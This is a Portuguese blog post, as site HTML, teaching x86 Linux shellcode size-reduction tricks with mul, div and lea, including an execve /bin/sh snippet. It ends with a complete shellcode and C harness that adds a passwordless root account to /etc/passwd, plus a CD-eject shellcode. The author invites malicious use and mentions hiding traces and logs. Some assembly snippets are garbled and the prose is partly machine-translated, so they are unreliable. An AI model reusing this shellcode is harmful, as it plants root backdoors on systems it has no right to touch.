<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Tecnicas Avançadas Shellcoding [asm]</title>
	
	<meta name="author" content="mh4x0f">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">
	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/mh4x0f">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/mh4x0f">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:mh4root@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" />
				
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" style="width:112px;height:112px;" />
	</a>
	<h3 class="title">
        <a href="/"></a>
    </h3>
</header>


<div id="bio" class="text-center">
	One 0x41414141 worth a thousand words
</div>

<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/mh4x0f">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/mh4x0f">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:mh4root@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
		<form class="col-lg-12" action="http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity" method="post" target="popupwindow" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity', 'popupwindow', 'scrollbars=yes,width=250,height=220');return true" >
			<div class="input-group" style="width:240px;text-align:center;margin:0 auto;">
			<input type="hidden" value="chmodsecurity" name="uri" >
		  <input type="hidden" name="loc" value="pt_BR">
		  <input  id="input-rss"  style="width:160px;text-align:center;" placeholder="Digite  seu e-mail" class="form-control input-lg" type="text" name="email">
		  <span class="input-group-btn"><button id="btn-assinar" class="btn btn-lg btn-primary"  type="submit" value=" ASSINAR ">Assinar</button></span>
	      </div>
		</form>
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>Tecnicas Avançadas Shellcoding [asm] </h1>
</div>
	
<article>
	<div class="col-sm-10">
	 <span class="post-date">
	   
	   August 
	   7th,
	   
	   2014
	 </span>
	  <div class="article_body">
	  <p>asm sempre vai ti deixar louco não tem conversa com ela mesmo programando a anos você vai se bater em algum momento, o fato é, 'asm não é de Deus não'  rsrsr, voltando a assunto quando você inicia a saga para aprender a criar shellcode seja em x86 ou x64, começa ser mão de vaca quando fala-se em bytes, não tem jeito, se um dia eu aplicar essa ditadura de bytes para minha vida vou ficar rico não vou gastar nada não existe 'OSTENTAÇÃO', até porque o seu objetivo é deixar sem os Políticos(Os bad char), e deixar menos bytes possível isso mostra que você domina a linguagem. Você já deve saber  que criando Funções e JMP já ajuda no bypass dos Bad chars e armazenar nas parte baixa e altas do registrador ajuda também e como você sabe zerar os registradores antes de trabalha-los <a>xor eax.eax</a>. em fim, algumas técnicas podem ser usada para fazer isso, mas existe outros métodos de ser ainda mais 'Mão de Vaca','Mesquinho','Mão fechada' ? a resposta é sim, tem como usando algumas funções menos usadas podemos chegar em resultados excelentes do desenvolvimento de shellcodes vamos lá. Let's Goooo</p>
<h3>Multiplicação Mul</h3>
<p>à primeira vista, parecer banal, e é óbvio propósito. No entanto, quando  o difícil desafio de diminuir o shellcode meu parceiro, ele revela-se bastante útil. Primeiro algumas informações básicas sobre a própria instrução mul. mul realiza uma multiplicam sem sinal de dois inteiros. Leva apenas um operador, o outro é implicitamente especificada pelo registo eax%. Assim, uma instrução mul comum poderia ser algo como isto:</p>

<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="nf">movl</span> <span class="no">$</span> <span class="mi">0x0A</span><span class="p">,</span><span class="err">%</span> <span class="no">eax</span>
<span class="nf">mul</span> <span class="no">$</span> <span class="mi">0x0A</span></code></pre></div>

<p>Isto multiplicar o valor armazenado em% eax pelo operando de mul, que neste caso seria de 10 * 10. O resultado é, então, implicitamente armazenados em EDX: EAX. O resultado é armazenado durante um período de dois registos, porque tem o potencial de ser consideravelmente maior do que o valor anterior, podendo exceder a capacidade de um único registo (isto é também como pontos flutuantes são armazenados em alguns casos). Tá idaí?</p>
<p>Então, agora vem a pergunta sempre importante. Como podemos usar esses atributos para a nossa vantagem ao escrever shellcode? Bem, vamos pensar por um segundo, a instrução leva apenas um operando, portanto, uma vez que é uma instrução muito comum, ele irá gerar apenas dois bytes em nosso shellcode final. Ele multiplica tudo o que é passado para ele pelo valor armazenado em% eax e armazena o valor em ambos% edx e% eax, substituindo completamente o conteúdo de ambos os registos, independentemente de saber se é necessário fazê-lo, a fim de armazenar o resultado da multiplicação. Vamos colocar em nossas matemático chapéus por um segundo, e considerar isso, o que é o único resultado possível de uma multiplicação por 0? A resposta, como você deve ter adivinhado, é 0 Eu acho que está na hora de algum código de exemplo, então aqui está.:

<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="nf">xorl</span><span class="err">%</span> <span class="no">ecx</span><span class="p">,</span><span class="err">%</span> <span class="no">ecx</span>
<span class="nf">mul</span><span class="err">%</span> <span class="no">ecx</span></code></pre></div>
 
O que é isso shellcode fazendo? Bem, o 0 está fora do registo ecx% usando a instrução xor, então agora sabemos que% ecx é 0. Então ele faz um ecx% mul, que, como acabamos de aprender, multiplica é operando pelo valor em% eax, e, em seguida, passa a armazenar o resultado dessa multiplicação em EDX: EAX. Assim, independentemente do conteúdo anterior do% eax,% eax agora deve ser 0. Porém isso não é tudo,% edx é 0'd agora também, porque, apesar de não ocorrer nenhum estouro, ainda substitui o% edx registrar com o bit de sinal ( mais à esquerda bit) de% eax. Usando esta técnica nós podemos zerar três registros em apenas três bytes,(Olha só que economia pense você pode comprar 3 por 1 isso que é promoção meu amigo 3 por 10 três balas por 10 centavos quando eu era guri era assim )enquanto que por qualquer outro método (que eu saiba) que teria levado pelo menos seis. ou seja, se você tem que ser mão de vaca ao estremo parceiro, essas técnicas eu vi em um fórum blackhat no inicio achei estranho pelo fato de envolver muito mais instruções  em asm depois fui percebendo o porque logo veio o resultado poucos bytes no shellcode.</p>
<h3>Método da Instrução  DIV </h3>
<p>Essa Instrução  lógico é bem semelhante a 'mul', precisa apena de um argumento que é nosso registrador que divide o mesmo. mul ele armazena o resultado da divisão em% eax. Mais uma vez, vamos exigir o lado matemático do nosso cérebro para descobrir como podemos tirar proveito desta instrução. Mas, primeiro, vamos pensar sobre o que é normalmente armazenado no registrador eax%. O registo eax% mantém o valor de retorno de funções e / ou syscalls. A maioria syscalls que são usados &#8203;&#8203;em shellcoding retornará -1 (em caso de falha) ou um valor positivo de algum tipo, só raramente se voltará 0 (embora ele ocorrer). Então, se nós sabemos que depois de uma syscall é realizada,% eax terá um valor diferente de zero, e que a instrução divl% eax vai dividir% eax por si só, e depois armazenar o resultado em% eax, podemos dizer que a execução de a instrução eax divl% após uma syscall vai colocar o valor 1 em% eax. Então ... como isso é aplicável a shellcoding? Bem, a sua é outra coisa importante que% eax é utilizado passar a syscall específico que você gostaria de chamar para int $ 0x80. Acontece que a syscall que corresponde ao valor 1 é exit (). Agora, para um exemplo:</p>

<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="nf">xorl</span><span class="err">%</span> <span class="no">ebx</span><span class="p">,</span><span class="err">%</span> <span class="no">ebx</span>
<span class="nf">mul</span><span class="err">%</span> <span class="no">ebx</span>
<span class="nf">push</span><span class="err">%</span> <span class="no">edx</span>
<span class="nf">pushl</span> <span class="no">$</span> <span class="mi">0x3268732f</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span> 
<span class="no">pushl</span> <span class="no">$</span> <span class="mi">0x6e69622f</span> 
<span class="no">mov</span><span class="err">%</span> <span class="no">esp</span><span class="p">,</span><span class="err">%</span> <span class="no">ebx</span>
<span class="nf">push</span><span class="err">%</span> <span class="no">edx</span>
<span class="nf">push</span><span class="err">%</span> <span class="no">ebx</span>
<span class="nf">mov</span><span class="err">%</span> <span class="no">esp</span><span class="p">,</span><span class="err">%</span> <span class="no">ecx</span>
<span class="nf">movb</span> <span class="no">$</span> <span class="mi">0xB</span><span class="p">,</span><span class="err">%</span> <span class="no">al</span> <span class="c"># execve () syscall, não retornar a menos que ele falhar, caso em que ele retorna -1</span>
<span class="nf">int</span> <span class="no">$</span> <span class="mi">0x80</span> <span class="err">//</span><span class="no">syscall</span>
<span class="err">//</span><span class="nf">syscall</span> <span class="no">exit</span><span class="p">()</span> <span class="no">ExitProcess</span> 
<span class="no">divl</span><span class="err">%</span> <span class="no">eax</span> <span class="c"># -1 / -1 = 1 // Aqui a Magica acontece :D </span>
<span class="nf">int</span> <span class="no">$</span> <span class="mi">0x80</span> <span class="err">//</span></code></pre></div>

<p>Agora, temos uma função de saída de 3 bytes(hehhehe),que economia não ?, enquanto que antes era 5 bytes.(assim com toda esse economia nosso PIB vai aumentando em forma de PG )No entanto, há um problema, e se um syscall não retornar 0? Bem na situação estranha em que isso poderia acontecer, você pode fazer muitas coisas diferentes, como inc% eax,% e não% eax qualquer coisa que vai fazer% eax não-zero. Algumas pessoas dizem que a saída de não são importantes em shellcode, porque seu código é executado independentemente de haver ou não sai limpa.(mas pense bem economizar bytes meu parceiro é essencial aqui), Eles estão certos,(of course) também, se você realmente precisa para salvar 3 bytes para caber seu shellcode em algum lugar, o exit () não vale a pena manter. No entanto, quando o seu código faz acabamento, ele irá tentar executar o que estava após a última instrução, o que provavelmente irá produzir um SIG ILL (instrução ilegal) que é um erro muito estranho, e será registrado pelo sistema. Assim, um exit () simplesmente adiciona uma camada extra de cautela para o explorar, de modo que mesmo se ele falhar ou você não pode limpar todos os logs, pelo menos esta parte de sua presença será clara. se ligou :D é assim que funciona!</p>
<h3> Instrução Lea( Power Movie)</h3>
<p> Nada a ver esse Power Movie kkkk, saudade do meu tempo que praticava Breakdance, Flare,Airflare,moinho,freeze etc... era feliz e não sabia, eu coloquei Lea, mas seria Leal (geovane iria me resenhar por isso kkk), A instrução leal é uma instrução muitas vezes negligenciada(mandei bem na palavra eheheh treinando pro Enem) em shellcode, embora seja bastante útil. Considere este pequeno pedaço de shellcode.

<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="c">#setuid(0)</span>
<span class="c"># os caras fazem assim</span>
<span class="nf">xorl</span><span class="err">%</span> <span class="no">ecx</span><span class="p">,</span><span class="err">%</span> <span class="no">ecx</span>
<span class="nf">leal</span> <span class="mi">0x10</span> <span class="p">(</span><span class="err">%</span> <span class="no">ecx</span><span class="p">),</span><span class="err">%</span> <span class="no">eax</span></code></pre></div>
 
Isto irá carregar o valor 17 em eax e desmarque todos os bits estranhos de eax. Isso ocorre porque a instrução leal carrega uma variável do tipo por muito tempo no que é desitination operador. Em sua utilização normal, isso seria carregar o endereço de uma variável em um registrador, criando assim uma espécie de ponteiro. No entanto, desde ecx é 0'd e 0 +17 = 17,  carregamos o valor 17 em eax em vez de qualquer tipo de endereço real. Em um shellcode normais faríamos algo assim, para realizar a mesma coisa:

<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="nf">xorl</span><span class="err">%</span> <span class="no">eax</span><span class="p">,</span><span class="err">%</span> <span class="no">eax</span>
<span class="nf">movb</span> <span class="no">$</span> <span class="mi">0x10</span><span class="p">,</span><span class="err">%</span> <span class="no">eax</span></code></pre></div>
 
Eu posso ouvir você dizer, mas isso é um shellcode byte mais curto que o leal, e você está certo. No entanto, em um shellcode real, você já pode ter a 0 fora de um registo como ecx (ou qualquer outro registro), de modo que a instrução xorl no shellcode leal não é contado. Aqui está um exemplo:

<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="nf">xorl</span><span class="err">%</span> <span class="no">eax</span><span class="p">,</span><span class="err">%</span> <span class="no">eax</span> <span class="c">#zera eax</span>
<span class="nf">xorl</span><span class="err">%</span> <span class="no">ebx</span><span class="p">,</span><span class="err">%</span> <span class="no">ebx</span> <span class="c">#novamente</span>
<span class="nf">movb</span> <span class="no">$</span> <span class="mi">0x17</span><span class="p">,</span><span class="err">%</span> <span class="no">al</span> <span class="c">#setuid(0) </span>
<span class="nf">int</span> <span class="no">$</span> <span class="mi">0x80</span> <span class="err">//</span> <span class="no">sys</span> <span class="no">call</span> <span class="no">parceiro</span> 
 
<span class="c"># Modo AutoBoot Megatron(de onde eu tirei isso kkk)</span>
<span class="nf">xorl</span><span class="err">%</span> <span class="no">ebx</span><span class="p">,</span><span class="err">%</span> <span class="no">ebx</span> <span class="c"># </span>
<span class="nf">leal</span> <span class="mi">0x17</span> <span class="p">(</span><span class="err">%</span> <span class="no">ebx</span><span class="p">),</span><span class="err">%</span> <span class="no">al</span> <span class="c"># forma Hitler kkk</span>
<span class="nf">int</span> <span class="no">$</span> <span class="mi">0x80</span> <span class="c"># syscall</span></code></pre></div>
 
Ambos os shellcodes chamar setuid (0), mas se faz isso em 7 bytes, enquanto o outro o faz em 8. Novamente, eu ouvi-lo dizer, mas isso é apenas um byte não fazer muita diferença, e você re bem, aqui não faz muita diferença (exceto no shellcode porte concursos mijando = p), mas quando aplicado a shellcodes muito maiores, que têm muitas chamadas de função e precisa fazer coisas como esta frequentemente, pode economizar um pouco de espaço.
</p>
<h3>Conclusão:</h3>
<p> I Hope, que você use essas dicas para fazer algum maligno futuramente, como sempre quem faz shellcoding precisa deixar cada vez menor, o tamanho de bytes, por exemplo uma /bin/sh o menor que ja vi funcional é 24 bytes, tem de 18 mas não funciona muito bem eu fiz um 27 bytes acho que ta bom até.::</p>

<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="err">/*</span>
 <span class="err">*</span> <span class="err">(</span><span class="nf">linux</span><span class="err">/</span><span class="no">x86</span><span class="p">)</span> <span class="no">adds</span> <span class="no">user</span> <span class="err">&#39;</span><span class="no">xtz</span><span class="err">&#39;</span> <span class="no">without</span> <span class="no">password</span> <span class="no">to</span> <span class="err">/</span><span class="no">etc</span><span class="err">/</span><span class="no">passwd</span> <span class="p">-</span> <span class="mi">59</span> <span class="no">bytes</span>
 <span class="err">*</span> <span class="err">-</span> <span class="nf">Itzik</span> <span class="no">Kotler</span> <span class="err">&lt;</span><span class="no">ik@ikotler.org</span><span class="err">&gt;</span>
 <span class="err">*/</span>

<span class="nf">char</span> <span class="no">shellcode</span><span class="err">[]</span> <span class="err">=</span> 

	<span class="err">&quot;\</span><span class="no">x6a</span><span class="err">\</span><span class="no">x05</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">push</span> <span class="no">$0x5</span> 

	<span class="err">//</span>
	<span class="err">//</span> <span class="err">&lt;</span><span class="nf">_exit</span><span class="err">&gt;</span><span class="p">:</span>
	<span class="err">//</span>

	<span class="err">&quot;\</span><span class="nf">x58</span><span class="err">&quot;</span>                  <span class="err">//</span> <span class="no">pop</span> <span class="nv">%eax</span> 
	<span class="err">&quot;\</span><span class="no">x99</span><span class="err">&quot;</span>                  <span class="err">//</span> <span class="no">cltd</span> 
	<span class="err">&quot;\</span><span class="no">x31</span><span class="err">\</span><span class="no">xc9</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">xor</span> <span class="nv">%ecx</span><span class="p">,</span><span class="nv">%ecx</span> 
	<span class="err">&quot;\</span><span class="no">x66</span><span class="err">\</span><span class="no">xb9</span><span class="err">\</span><span class="no">x01</span><span class="err">\</span><span class="no">x04</span><span class="err">&quot;</span>      <span class="err">//</span> <span class="no">mov</span> <span class="no">$0x401</span><span class="p">,</span><span class="nv">%cx</span> 
	<span class="err">&quot;\</span><span class="no">x52</span><span class="err">&quot;</span>                  <span class="err">//</span> <span class="no">push</span> <span class="nv">%edx</span> 
	<span class="err">&quot;\</span><span class="no">x68</span><span class="err">\</span><span class="no">x73</span><span class="err">\</span><span class="no">x73</span><span class="err">\</span><span class="no">x77</span><span class="err">\</span><span class="no">x64</span><span class="err">&quot;</span>  <span class="err">//</span> <span class="no">push</span> <span class="no">$0x64777373</span> 
	<span class="err">&quot;\</span><span class="no">x68</span><span class="err">\</span><span class="no">x63</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x70</span><span class="err">\</span><span class="no">x61</span><span class="err">&quot;</span>  <span class="err">//</span> <span class="no">push</span> <span class="no">$0x61702f63</span> 
	<span class="err">&quot;\</span><span class="no">x68</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x65</span><span class="err">\</span><span class="no">x74</span><span class="err">&quot;</span>  <span class="err">//</span> <span class="no">push</span> <span class="no">$0x74652f2f</span> 
	<span class="err">&quot;\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe3</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">mov</span> <span class="nv">%esp</span><span class="p">,</span><span class="nv">%ebx</span> 
	<span class="err">&quot;\</span><span class="no">xcd</span><span class="err">\</span><span class="no">x80</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">int</span> <span class="no">$0x80</span> 
	<span class="err">&quot;\</span><span class="no">x68</span><span class="err">\</span><span class="no">x3a</span><span class="err">\</span><span class="no">x3a</span><span class="err">\</span><span class="no">x3a</span><span class="err">\</span><span class="no">x0a</span><span class="err">&quot;</span>  <span class="err">//</span> <span class="no">push</span> <span class="no">$0xa3a3a3a</span> 
	<span class="err">&quot;\</span><span class="no">x68</span><span class="err">\</span><span class="no">x3a</span><span class="err">\</span><span class="no">x30</span><span class="err">\</span><span class="no">x3a</span><span class="err">\</span><span class="no">x30</span><span class="err">&quot;</span>  <span class="err">//</span> <span class="no">push</span> <span class="no">$0x303a303a</span> 
	<span class="err">&quot;\</span><span class="no">x68</span><span class="err">\</span><span class="no">x78</span><span class="err">\</span><span class="no">x74</span><span class="err">\</span><span class="no">x7a</span><span class="err">\</span><span class="no">x3a</span><span class="err">&quot;</span>  <span class="err">//</span> <span class="no">push</span> <span class="no">$0x3a7a7478</span> 
	<span class="err">&quot;\</span><span class="no">x89</span><span class="err">\</span><span class="no">xc3</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">mov</span> <span class="nv">%eax</span><span class="p">,</span><span class="nv">%ebx</span> 
	<span class="err">&quot;\</span><span class="no">xb0</span><span class="err">\</span><span class="no">x04</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">mov</span> <span class="no">$0x4</span><span class="p">,</span><span class="nv">%al</span> 
	<span class="err">&quot;\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe1</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">mov</span> <span class="nv">%esp</span><span class="p">,</span><span class="nv">%ecx</span> 
	<span class="err">&quot;\</span><span class="no">xb2</span><span class="err">\</span><span class="no">x0c</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">mov</span> <span class="no">$0xc</span><span class="p">,</span><span class="nv">%dl</span> 
	<span class="err">&quot;\</span><span class="no">xcd</span><span class="err">\</span><span class="no">x80</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">int</span> <span class="no">$0x80</span> 
	<span class="err">&quot;\</span><span class="no">x6a</span><span class="err">\</span><span class="no">x01</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">push</span> <span class="no">$0x1</span> 
	<span class="err">&quot;\</span><span class="no">xeb</span><span class="err">\</span><span class="no">xc7</span><span class="err">&quot;;</span>             <span class="err">//</span> <span class="mh">jmp</span> <span class="p">&lt;</span><span class="no">_exit</span><span class="p">&gt;</span>

<span class="nf">int</span> <span class="no">main</span><span class="p">(</span><span class="no">int</span> <span class="no">argc</span><span class="p">,</span> <span class="no">char</span> <span class="p">**</span><span class="no">argv</span><span class="p">)</span> <span class="err">{</span>
	<span class="nf">int</span> <span class="p">*</span><span class="no">ret</span><span class="err">;</span>
	<span class="nf">ret</span> <span class="err">=</span> <span class="p">(</span><span class="no">int</span> <span class="p">*)</span><span class="err">&amp;</span><span class="no">ret</span> <span class="err">+</span> <span class="mi">2</span><span class="err">;</span>
	<span class="err">(*</span><span class="nf">ret</span><span class="p">)</span> <span class="err">=</span> <span class="p">(</span><span class="no">int</span><span class="p">)</span> <span class="no">shellcode</span><span class="err">;</span>
<span class="err">}</span></code></pre></div>

<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="err">/*</span>
 <span class="err">*</span> <span class="err">(</span><span class="nf">linux</span><span class="err">/</span><span class="no">x86</span><span class="p">)</span> <span class="no">eject</span> <span class="no">cd-rom</span> <span class="p">(</span><span class="no">follows</span> <span class="err">&quot;/</span><span class="no">dev</span><span class="err">/</span><span class="no">cdrom</span><span class="err">&quot;</span> <span class="no">symlink</span><span class="p">)</span> <span class="err">+</span> <span class="no">exit</span><span class="p">()</span> <span class="p">-</span> <span class="mi">40</span> <span class="no">bytes</span>
 <span class="err">*</span> <span class="err">-</span> <span class="nf">Itzik</span> <span class="no">Kotler</span> <span class="err">&lt;</span><span class="no">ik@ikotler.org</span><span class="err">&gt;</span>
 <span class="err">*/</span>

<span class="nf">char</span> <span class="no">shellcode</span><span class="err">[]</span> <span class="err">=</span> 

	<span class="err">&quot;\</span><span class="no">x6a</span><span class="err">\</span><span class="no">x05</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">push</span> <span class="no">$0x5</span> 
	<span class="err">&quot;\</span><span class="no">x58</span><span class="err">&quot;</span>                  <span class="err">//</span> <span class="no">pop</span> <span class="nv">%eax</span> 
	<span class="err">&quot;\</span><span class="no">x31</span><span class="err">\</span><span class="no">xc9</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">xor</span> <span class="nv">%ecx</span><span class="p">,</span><span class="nv">%ecx</span> 
	<span class="err">&quot;\</span><span class="no">x51</span><span class="err">&quot;</span>                  <span class="err">//</span> <span class="no">push</span> <span class="nv">%ecx</span> 
	<span class="err">&quot;\</span><span class="no">xb5</span><span class="err">\</span><span class="no">x08</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">mov</span> <span class="no">$0x8</span><span class="p">,</span><span class="nv">%ch</span> 
	<span class="err">&quot;\</span><span class="no">x68</span><span class="err">\</span><span class="no">x64</span><span class="err">\</span><span class="no">x72</span><span class="err">\</span><span class="no">x6f</span><span class="err">\</span><span class="no">x6d</span><span class="err">&quot;</span>  <span class="err">//</span> <span class="no">push</span> <span class="no">$0x6d6f7264</span> 
	<span class="err">&quot;\</span><span class="no">x68</span><span class="err">\</span><span class="no">x65</span><span class="err">\</span><span class="no">x76</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x63</span><span class="err">&quot;</span>  <span class="err">//</span> <span class="no">push</span> <span class="no">$0x632f7665</span> 
	<span class="err">&quot;\</span><span class="no">x68</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x64</span><span class="err">&quot;</span>  <span class="err">//</span> <span class="no">push</span> <span class="no">$0x642f2f2f</span> 
	<span class="err">&quot;\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe3</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">mov</span> <span class="nv">%esp</span><span class="p">,</span><span class="nv">%ebx</span> 
	<span class="err">&quot;\</span><span class="no">xcd</span><span class="err">\</span><span class="no">x80</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">int</span> <span class="no">$0x80</span> 
	<span class="err">&quot;\</span><span class="no">x89</span><span class="err">\</span><span class="no">xc3</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">mov</span> <span class="nv">%eax</span><span class="p">,</span><span class="nv">%ebx</span> 
	<span class="err">&quot;\</span><span class="no">xb0</span><span class="err">\</span><span class="no">x36</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">mov</span> <span class="no">$0x36</span><span class="p">,</span><span class="nv">%al</span> 
	<span class="err">&quot;\</span><span class="no">x66</span><span class="err">\</span><span class="no">xb9</span><span class="err">\</span><span class="no">x09</span><span class="err">\</span><span class="no">x53</span><span class="err">&quot;</span>      <span class="err">//</span> <span class="no">mov</span> <span class="no">$0x5309</span><span class="p">,</span><span class="nv">%cx</span>
	<span class="err">&quot;\</span><span class="nf">xcd</span><span class="err">\</span><span class="no">x80</span><span class="err">&quot;</span>              <span class="err">//</span> <span class="no">int</span> <span class="no">$0x80</span> 
	<span class="err">&quot;\</span><span class="no">x40</span><span class="err">&quot;</span>                  <span class="err">//</span> <span class="no">inc</span> <span class="nv">%eax</span> 
	<span class="err">&quot;\</span><span class="no">xcd</span><span class="err">\</span><span class="no">x80</span><span class="err">&quot;;</span>             <span class="err">//</span> <span class="no">int</span> <span class="no">$0x80</span> 

<span class="no">int</span> <span class="no">main</span><span class="p">(</span><span class="no">int</span> <span class="no">argc</span><span class="p">,</span> <span class="no">char</span> <span class="p">**</span><span class="no">argv</span><span class="p">)</span> <span class="err">{</span>
	<span class="nf">int</span> <span class="p">*</span><span class="no">ret</span><span class="err">;</span>
	<span class="nf">ret</span> <span class="err">=</span> <span class="p">(</span><span class="no">int</span> <span class="p">*)</span><span class="err">&amp;</span><span class="no">ret</span> <span class="err">+</span> <span class="mi">2</span><span class="err">;</span>
	<span class="err">(*</span><span class="nf">ret</span><span class="p">)</span> <span class="err">=</span> <span class="p">(</span><span class="no">int</span><span class="p">)</span> <span class="no">shellcode</span><span class="err">;</span>
<span class="err">}</span></code></pre></div>


	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="/categories.html#asm-ref">
					asm <span>(1)</span>
					
				</a></li>
			
		  
		</ul>
		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#shellcode-ref">
					shellcode <span>(3)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#linux-ref">
					linux <span>(5)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#asm-ref">
					asm <span>(3)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#syscall-ref">
					syscall <span>(2)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Tecnicas Avançadas Shellcoding [asm]&via=mh4x0f"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
